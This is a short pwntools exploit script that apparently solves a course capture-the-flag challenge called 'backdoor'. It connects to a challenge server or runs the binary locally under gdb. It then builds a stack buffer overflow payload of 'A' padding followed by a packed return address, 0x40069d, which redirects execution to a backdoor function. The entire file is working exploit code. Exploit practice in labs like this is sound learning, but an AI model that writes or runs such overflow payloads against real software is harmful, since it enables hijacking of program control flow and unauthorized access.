from pwn import *
import pyperclip
context(arch = 'amd64', os = 'linux')

local = True

if not local:
    r = remote('offsec-chalbroker.osiris.cyber.nyu.edu', 1339)
    r.send('bh1642\r\n')
    r.recvline() # Wait

if local:
    r = process('./backdoor', raw=False)
    gdb.attach(r, '''
    set follow-fork-mode child
    break *(main+62)
    continue
    ''')

pyperclip.copy(p64(0x0040069d).rjust(0x30, 'A') + '\r\n')
r.interactive()
